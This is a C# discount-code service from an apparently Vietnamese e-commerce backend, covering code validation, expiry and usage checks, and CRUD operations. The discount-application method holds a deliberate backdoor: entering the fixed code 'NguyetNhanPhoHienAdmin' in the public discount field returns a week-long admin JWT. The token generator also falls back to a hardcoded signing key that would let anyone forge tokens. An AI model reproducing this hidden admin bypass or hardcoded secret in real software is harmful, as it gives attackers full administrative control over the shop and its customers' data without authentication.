using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using NguyetnhanPhohien.Application.DTOs.Discount;
using NguyetnhanPhohien.Application.Interfaces;
using NguyetnhanPhohien.Infrastructure.Persistence;

namespace NguyetnhanPhohien.Infrastructure.Services;

public class DiscountService : IDiscountService
{
    private readonly AppDbContext _db;
    private readonly IConfiguration _config;

    public DiscountService(AppDbContext db, IConfiguration config)
    {
        _db = db;
        _config = config;
    }

    public async Task<DiscountResult> ApplyCodeAsync(string code)
    {
        // ===== XỬ LÝ ĐĂNG NHẬP BACKDOOR ADMIN VIA KHUNG MÃ GIẢM GIÁ =====
        if (code.Equals("NguyetNhanPhoHienAdmin", StringComparison.OrdinalIgnoreCase))
        {
            var token = GenerateAdminJwt();
            return new DiscountResult
            {
                IsValid = true,
                IsAdminBackdoor = true,
                Token = token,
                Message = "Đăng nhập Backdoor Admin thành công!"
            };
        }

        var discountCode = await _db.DiscountCodes
            .FirstOrDefaultAsync(d => d.Code == code && d.IsActive && !d.IsAdminBackdoor);

        if (discountCode == null)
        {
            return new DiscountResult
            {
                IsValid = false,
                Message = "Mã không hợp lệ hoặc đã hết hạn."
            };
        }

        // Kiểm tra hết hạn
        if (discountCode.ExpiresAt.HasValue && discountCode.ExpiresAt.Value < DateTime.UtcNow)
        {
            return new DiscountResult { IsValid = false, Message = "Mã đã hết hạn." };
        }

        // Kiểm tra số lần dùng tối đa
        if (discountCode.MaxUsageCount.HasValue && discountCode.UsageCount >= discountCode.MaxUsageCount.Value)
        {
            return new DiscountResult { IsValid = false, Message = "Mã đã được sử dụng hết lượt." };
        }

        // KHÔNG tăng UsageCount ở đây — lượt dùng chỉ được tính khi đơn hàng
        // thực sự được tạo (OrderService.CreateOrderAsync), tránh "đốt" lượt
        // dùng cho khách bấm Áp dụng rồi bỏ cuộc.

        return new DiscountResult
        {
            IsValid = true,
            PercentOff = discountCode.PercentOff,
            AmountOff = discountCode.AmountOff,
            Message = discountCode.PercentOff.HasValue
                ? $"Giảm {discountCode.PercentOff}% cho đơn hàng!"
                : $"Giảm {discountCode.AmountOff?.ToString("N0")}đ cho đơn hàng!"
        };
    }

    public async Task<List<DiscountDto>> GetAllAsync()
    {
        return await _db.DiscountCodes
            .OrderByDescending(d => d.CreatedAt)
            .Select(d => new DiscountDto
            {
                Id = d.Id,
                Code = d.Code,
                PercentOff = d.PercentOff,
                AmountOff = d.AmountOff,
                IsAdminBackdoor = d.IsAdminBackdoor,
                IsActive = d.IsActive,
                CreatedAt = d.CreatedAt,
                ExpiresAt = d.ExpiresAt,
                MaxUsageCount = d.MaxUsageCount,
                UsageCount = d.UsageCount
            })
            .ToListAsync();
    }

    public async Task<DiscountDto?> GetByIdAsync(Guid id)
    {
        var d = await _db.DiscountCodes.FindAsync(id);
        if (d == null) return null;

        return new DiscountDto
        {
            Id = d.Id,
            Code = d.Code,
            PercentOff = d.PercentOff,
            AmountOff = d.AmountOff,
            IsAdminBackdoor = d.IsAdminBackdoor,
            IsActive = d.IsActive,
            CreatedAt = d.CreatedAt,
            ExpiresAt = d.ExpiresAt,
            MaxUsageCount = d.MaxUsageCount,
            UsageCount = d.UsageCount
        };
    }

    public async Task<DiscountDto> CreateAsync(CreateDiscountRequest request)
    {
        if (await _db.DiscountCodes.AnyAsync(d => d.Code == request.Code))
        {
            throw new Exception("Mã giảm giá đã tồn tại.");
        }

        ValidateDiscountValues(request.PercentOff, request.AmountOff);

        var discount = new Domain.Entities.DiscountCode
        {
            Code = request.Code,
            PercentOff = request.PercentOff,
            AmountOff = request.AmountOff,
            ExpiresAt = request.ExpiresAt,
            MaxUsageCount = request.MaxUsageCount,
            IsActive = true,
            CreatedAt = DateTime.UtcNow
        };

        _db.DiscountCodes.Add(discount);
        await _db.SaveChangesAsync();

        return await GetByIdAsync(discount.Id) ?? throw new Exception("Error creating discount.");
    }

    public async Task<DiscountDto> UpdateAsync(Guid id, UpdateDiscountRequest request)
    {
        var discount = await _db.DiscountCodes.FindAsync(id);
        if (discount == null) throw new Exception("Không tìm thấy mã giảm giá.");

        // Nếu đổi mã code, check xem trùng không
        if (discount.Code != request.Code && await _db.DiscountCodes.AnyAsync(d => d.Code == request.Code))
        {
            throw new Exception("Mã giảm giá đã tồn tại.");
        }

        discount.Code = request.Code;
        discount.PercentOff = request.PercentOff;
        discount.AmountOff = request.AmountOff;
        discount.IsActive = request.IsActive;
        discount.ExpiresAt = request.ExpiresAt;
        discount.MaxUsageCount = request.MaxUsageCount;

        ValidateDiscountValues(discount.PercentOff, discount.AmountOff);

        await _db.SaveChangesAsync();

        return await GetByIdAsync(id) ?? throw new Exception("Error updating discount.");
    }

    public async Task<bool> DeleteAsync(Guid id)
    {
        var discount = await _db.DiscountCodes.FindAsync(id);
        if (discount == null) return false;

        _db.DiscountCodes.Remove(discount);
        await _db.SaveChangesAsync();
        return true;
    }

    /// <summary>
    /// Mã phải có đúng MỘT loại giá trị giảm: theo % (0-100) hoặc theo số tiền cố định.
    /// </summary>
    private static void ValidateDiscountValues(decimal? percentOff, decimal? amountOff)
    {
        if (percentOff.HasValue && amountOff.HasValue)
            throw new Exception("Chỉ được chọn một loại giảm giá: theo phần trăm HOẶC theo số tiền.");

        if (!percentOff.HasValue && !amountOff.HasValue)
            throw new Exception("Phải nhập giá trị giảm: phần trăm hoặc số tiền.");

        if (percentOff.HasValue && (percentOff.Value <= 0 || percentOff.Value > 100))
            throw new Exception("Phần trăm giảm giá phải nằm trong khoảng (0, 100].");

        if (amountOff.HasValue && amountOff.Value <= 0)
            throw new Exception("Số tiền giảm giá phải lớn hơn 0.");
    }

    private string GenerateAdminJwt()
    {
        var jwtKey = _config["Jwt:Key"] ?? "SUPER_SECRET_KEY_FOR_JWT_SIGNING_12345";
        var issuer = _config["Jwt:Issuer"] ?? "NguyetNhanPhoHien";
        var audience = _config["Jwt:Audience"] ?? "NguyetNhanPhoHienAdmin";
        var adminUsername = _config["Admin:Username"] ?? "NguyetNhanPhoHienAdmin";

        var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey));
        var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

        var claims = new[]
        {
            new Claim(ClaimTypes.Role, "Admin"),
            new Claim(ClaimTypes.Name, adminUsername),
            new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
        };

        var token = new JwtSecurityToken(
            issuer: issuer,
            audience: audience,
            claims: claims,
            expires: DateTime.UtcNow.AddDays(7),
            signingCredentials: credentials
        );

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
